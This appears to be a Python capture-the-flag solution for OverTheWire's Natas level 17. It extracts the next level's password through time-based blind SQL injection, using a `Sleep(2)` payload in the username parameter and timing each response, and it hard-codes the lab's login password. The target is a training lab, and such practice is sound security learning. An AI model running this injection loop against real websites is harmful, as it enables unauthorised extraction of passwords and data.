import requests
import time

#variables used to send request
url = 'http://natas17.natas.labs.overthewire.org/'
username = 'natas17'
password = 'XkEuChE0SbnKBvH1RU7ksIb9uuLmI7sd'

#final password variable and list of characters
final_password = ''
chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890'

#main loop that will go through every password index and try every single character until the response takes > 2s
print("Starting password crack...")
for i in range(1,33):
    print("Password: "+final_password+(32-i)*"*")
    for j in range(0,62):
        input_query = 'natas18" AND BINARY substring(password,'+str(i)+',1)="'+chars[j]+'" AND Sleep(2); #'
        start_time = time.time()
        response = requests.get(url, auth=(username,password), params={"username":input_query})
        end_time = time.time()
        response_time = end_time - start_time
        if(response_time > 2):
            print("Found character: "+chars[j])
            final_password += chars[j]
            break

#print final password
print("Final Password: ", final_password)
